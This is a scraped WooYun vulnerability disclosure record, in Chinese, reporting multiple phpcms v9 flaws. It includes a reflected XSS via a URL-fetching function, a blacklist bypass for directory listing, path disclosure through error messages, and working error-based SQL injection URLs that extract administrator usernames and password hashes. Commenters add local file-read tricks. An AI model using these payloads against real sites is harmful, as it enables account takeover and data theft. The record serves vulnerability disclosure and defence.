{"id": 19044, "wybug_id": "wooyun-2012-09463", "wybug_title": "phpcms v9 Multiple Vulnerabilities", "wybug_corp": "盛大网络", "wybug_author": "Zvall", "wybug_date": "2012-07-11 09:41", "wybug_open_date": "2012-07-16 09:42", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "反射型", "字符类型注射", "源码审核", "错误信息未屏蔽", "注射技巧", "技巧", "路径泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-07-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-07-16：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： hpcmsV9最新版SQL注射+XSS 详细说明：  XSS \npublic function public_get_suggest_keyword() {\t\t$url = $_GET['url'].'&q='.$_GET['q']; \t\techo $url;\t\t\t\t$res = @file_get_contents($url);\t\tif(CHARSET != 'gbk') {\t\t\t$res = iconv('gbk', CHARSET, $res);\t\t}\t\techo $res;\t}\n利用方法：http://localhost/phpcms/index.php?m=search&a=public_get_suggest_keyword&url=http://localhost/&q=1新建一个名为&q=1的文件 写入 <script>alert(/Zvall/)</script>黑名单过滤：这里只说过滤方式. 这里并没有权限访问\nif(!$this->admin_username) return false;\t\tif($_GET['args']) extract(getswfinit($_GET['args']));\t\t$dir = isset($_GET['dir']) && trim($_GET['dir']) ? str_replace(array('..\\\\', '../', './', '.\\\\','..'), '', trim($_GET['dir'])) : '';\t\t$filepath = $this->upload_path.$dir;\t\t$list = glob($filepath.'/'.'*');\t\tif(!empty($list)) rsort($list);\t\t$local = str_replace(array(PC_PATH, PHPCMS_PATH ,DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR), array('','',DIRECTORY_SEPARATOR), $filepath);\t\t$url = ($dir == '.' || $dir=='') ? $this->upload_url : $this->upload_url.str_replace('.', '', $dir).'/';\t\t$show_header = true;\t\tinclude $this->admin_tpl('album_dir');\nhttp://localhost/phpcms/index.php?m=attachment&a=album_dir&dir=.\\.\\  用黑名单过滤始终是不可取的路径泄露\nif (empty($filename)) $filename = ROUTE_C;  \t\tif (empty($m)) $m = ROUTE_M; \t\t$filepath = PC_PATH.'modules'.DIRECTORY_SEPARATOR.$m.DIRECTORY_SEPARATOR.$filename.'.php';\t\tif (file_exists($filepath)) {\t\t\t$classname = $filename;\t\t\tinclude $filepath;\t\t\tif ($mypath = pc_base::my_path($filepath)) {\t\t\t\t$classname = 'MY_'.$filename;\t\t\t\tinclude $mypath;\t\t\t}\t\t\treturn new $classname;\n没进行容错处理提交：http://v9.demo.phpcms.cn/index.php?m=../model&c=member_group_model.class由于member_group_model.class 类不存在 会报错Fatal error: Class 'member_group_model.class' not found in /workspace/wwwroot/v9.demo.phpcms.cn/phpcms/libs/classes/application.class.php onhttp://v9.demo.phpcms.cn/index.php?m=../../Fatal error: Cannot redeclare timeinterval() (previously declared in /workspace/wwwroot/v9.demo.phpcms.cn/phpcms/libs/functions/autoload/info.func.php:15) in /workspace/wwwroot/v9.demo.phpcms.cn/phpcms/libs/functions/autoload/info.func.php on line 27    漏洞证明：  XSS:\n\nSQL注入：\n\nhttp://localhost/phpcms/index.php?a=list_type&c=index&m=link&siteid='+and(select+1+from(select+count(*),concat((select+(select+(select+concat(0x7e,0x27,unhex(Hex(cast(v9_admin.username+as+char))),0x27,0x7e)+from+`phpcmsv9`.v9_admin+Order+by+userid+limit+0,1)+)+from+`information_schema`.tables+limit+0,1),floor(rand(0)*2))x+from+`information_schema`.tables+group+by+x)a)+and+'1'%3D'1\n\nhttp://localhost/phpcms/index.php?a=list_type&c=index&m=link&siteid='+and(select+1+from(select+count(*),concat((select+(select+(select+concat(0x7e,0x27,unhex(Hex(cast(v9_admin.password+as+char))),0x27,0x7e)+from+`phpcmsv9`.v9_admin+Order+by+userid+limit+0,1)+)+from+`information_schema`.tables+limit+0,1),floor(rand(0)*2))x+from+`information_schema`.tables+group+by+x)a)+and+'1'%3D'1\n\n   修复方案：  过滤啊啊啊啊！   版权声明：转载请注明来源 Zvall@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2012-07-16 09:42 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-07-11 10:03 |    \t\tZvall \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:14        | hello world)\t\t \n  本机gpc为关~_~    \n     2012-07-11 10:08 |    \t\tNc4 \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:5        | 脚本、渗透、服务器安全探索)\t\t \n  @Zvall 关注。    \n     2012-07-11 10:26 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  V5    \n     2012-07-11 10:35 |    \t\t西毒 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:33        | 心存谦卑才能不断超越自我)\t\t \n  @Zvall 关注中    \n     2012-07-11 11:36 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  关注中    \n     2012-07-11 12:38 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  洞主，$res = @file_get_contents($url); 为啥不去读文件呢    \n     2012-07-11 12:52 |    \t\tdraGxn \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:4        | 路慢慢。。。)\t\t \n  关注，求细节。    \n     2012-07-11 13:52 |    \t\tCnCxzSec(衰仔) \t\t\t( 普通白帽子  |\t\t\t        Rank:322 漏洞数:32        | Wow~~~)\t\t \n  @xsser  这。。。。不就相当于直接告诉大家漏洞在哪里了么……    \n     2012-07-11 15:33 |    \t\tZvall \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:14        | hello world)\t\t \n  @CnCxzSec(衰仔) $url = $_GET['url'].'&q='.$_GET['q']; &q=1.txt同志看清了哈    \n     2012-07-11 15:34 |    \t\tZvall \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:14        | hello world)\t\t \n  @CnCxzSec(衰仔) &q=    \n     2012-07-11 15:38 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @Zvall %00 和 长文件截断都可以利用    \n     2012-07-12 15:56 |    \t\tCnCxzSec(衰仔) \t\t\t( 普通白帽子  |\t\t\t        Rank:322 漏洞数:32        | Wow~~~)\t\t \n  @Zvall  @xsser url=asdf&q=../../index.php 已demo成功    \n     2012-07-12 15:57 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @CnCxzSec(衰仔) good,let's make a new post on wooyun    \n     2012-07-13 09:13 |    \t\tZvall \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:14        | hello world)\t\t \n  @xsser  一开始我也想到了读文件 但我本机测试没成功。。这个版本很烂。。漏洞一大堆      \n     2012-07-14 19:14 |    \t\tZvall \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:14        | hello world)\t\t \n  @xsser 测试成功。我本机环境配置有问题    \n     2012-07-14 19:18 |    \t\tZvall \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:14        | hello world)\t\t \n  @CnCxzSec(衰仔) 测试成功。我本机环境配置有问题file_get_contents可取远程 不可读本地文件    \n     2012-07-16 09:48 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  @Zvall 求大神指点.\\.\\是干什么的    \n     2012-07-17 15:05 |    \t\t灵惜 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:2        | 哇咔咔，搞定它)\t\t \n  昨天出补丁了 http://bbs.phpcms.cn/thread-621649-1-1.html     \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}